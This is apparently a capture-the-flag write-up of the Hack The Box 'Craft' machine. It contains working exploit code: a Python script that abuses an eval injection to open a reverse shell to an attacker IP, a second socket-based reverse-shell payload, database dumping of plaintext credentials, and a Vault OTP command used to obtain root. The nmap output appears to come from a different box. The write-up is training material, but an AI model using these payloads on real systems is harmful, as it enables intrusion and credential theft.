---
title: Craft
tags: 
- writeups
---

![](https://i.imgur.com/DOJzRQ6.png)

## Recon


After running `nmap` we get:
```bash
# Nmap 7.80 scan initiated Fri Nov 22 09:31:03 2019 as: nmap -sC -sV -oA mango 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.14s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Changing hosts file

By looking at the source code we can see gogs and api subdomains


So I just modified the  /etc/hosts to the following in order to access them.
```
10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
```

### Gogs page
![](https://i.imgur.com/wDN37yi.png)


By a simple Google search we find out that [Gogs](https://gogs.io/) is a somewhat widely used git service.

Exploring the Craft repo we quickly find that there was an issue and a "fix" was implemented:
![](https://i.imgur.com/eAIzGds.png)

By simply looking at the code we can easily identify where the vulnerability is. That is, passing user defined input directly into the eval function. 

We can also see that an API is used in the test file, so let's take a look at it as well.

### API page
We are presented with this once the page loads:
![](https://i.imgur.com/4cdaJZf.png)

So as you can see we can login ( therefore getting a token ), check the validity of the token and delete,update,create,get brews. However we can't interact with it since we don't have any credentials in order to get a token...

But wait, let's take a closer look at those 2 commits from before. 

![](https://i.imgur.com/LjZ4X8U.png)

OH, there you go, credentials found in the source code. Very bad practice indeed :))

## Exploiting eval
Now that we have the credentials needed to get a token, we need to think of a way to exploit the eval function. Wel... that's easy we just need to do this:

```python
import requests
import json
import urllib3

urllib3.disable_warnings()

url = "https://api.craft.htb/api/"
s = requests.Session()
r = s.get(url + "auth/login", auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
token = json.loads(r.text)['token']
print(token)

data = {
    "abv"       : "__import__('os').system('bash -i >& /dev/tcp/10.10.15.136/7070 0>&1')#",
    "name"      : "test",
    "brewer"    : "test",
    "style"     : "test"
}
data = json.dumps(data)

headers = {
    'X-Craft-API-Token': token,
    'Content-Type': 'application/json'
}
r = s.post(url + "brew/", headers=headers, data=data)
print(r.text)
```

And start our listener:

```bash
nc -nvlp 7070
```

Execute it and... Nothing. But it sohuld work right?

Well that's what I thought in the first place as well, but after a lot of thinking, poking and coffe I found out that I was pretty restricted, so I said fuck it. And build the payload from scratch with the things I knew would work. 

Finally I've ended up with this:
```python
eval(compile("""for x in range(1):\n import socket,subprocess, os\n s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n s.connect(("10.10.15.200", 7070))\n os.dup2(s.fileno(),0)\n os.dup2(s.fileno(),1)\n os.dup2(s.fileno(),2)\n import pty\n pty.spawn("/bin/sh")""","","single"))
```

After running the same script again, but with this payload I've got a shell.  Hooray!!

## Escaping the jail
I run `whoami` and I'm root. Uhmmm.... That's pretty strange, but ok let's take the root.txt
```bash
cat: /root/root.txt: No such file or directory
```

At this point I was confused, I thought that I gained access to a box that I wasn't supposed to, but that couldn't happen. Thus, I took a deeper look and found out that I was in a jail. However, I was having access to a file that I was previously interested in, but couldn't find it in the gogs page. That file being *`settings.py`*

So I just saw it in the directory I was currently in and took a look at it:

```python
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

Another credentials, ok... but what can we do with them? Well, he is using them to connect to the db so let's do the same:
```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host='db',
                             user='craft',
                             password='qLGockJ6G2J75O',
                             db='craft',
                             cursorclass=pymysql.cursors.DictCursor)

try:
    with connection.cursor() as cursor:
        sql = "select * from users"
        cursor.execute(sql)
        result = cursor.fetchall()
        for i in range(len(result)):
            print(result[i])

finally:
    connection.close()
```

And we get:

```
{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
```

Nice we've now got the credentials for every user.
Now what?

At this point I thought to SSH with the found credentials, but it didn't work. So after getting into some really deep rabbit holes I've decided to try to connect to the Gogs page with the new secrets as a last hope.

And I've got in with the `gilfoyle` user, prompted with this:
![](https://i.imgur.com/Zwo1dtQ.png)

> **Note**: Don't overcomplicate things, work with what you have and exhaust every possibility before moving on

I've instantly looked at the `.ssh` folder and found the private key and therefore got user. 

## Getting root

Once I've got user I immediatly went back to the new repo to have a deeper look into it, since I learned my lesson from the previous incident.

After looking through almost everything, the `vault/secrets.sh` popped as the most interesting to have a look at:
```bash
#!/bin/bash
# set up vault secrets backend
vault secrets enable ssh

vault write ssh/roles/root_otp \
        key_type=otp \
        default_user=root \
        cidr_list=0.0.0.0/0
```

With the help from Google I've found [this](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html). I've just followed the article:

```bash
vault write ssh/creds/otp_key_role ip=10.10.10.110
```

Got the otp and used it to connect through SSH, since root was allowed to login.


## See Also
- [[write-ups/HTB]]
